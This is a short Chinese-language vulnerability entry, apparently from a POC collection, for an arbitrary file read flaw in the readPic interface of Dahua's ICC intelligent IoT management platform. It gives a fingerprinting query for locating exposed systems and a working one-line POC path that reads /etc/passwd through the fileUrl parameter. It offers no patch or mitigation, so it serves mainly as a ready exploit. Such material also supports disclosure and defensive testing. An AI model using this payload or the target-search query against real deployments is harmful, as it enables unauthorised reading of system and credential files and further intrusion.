# 大华 ICC智能物联综合管理平台 readPic 任意文件读取漏洞

## 漏洞描述

大化 ICC智能物联综合管理平台 readPic 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>大华 ICC智能物联综合管理平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="*客户端会小于800*"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1699017507127-ec89d0a3-0723-47b5-8479-13e5b6225041-20231108135931436.png)

验证POC

```php
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```

![img](../../../.vuepress/public/img/1699017568114-6f5e2d21-5f6b-4e68-95d3-54e5602263ae-20231108135935667.png)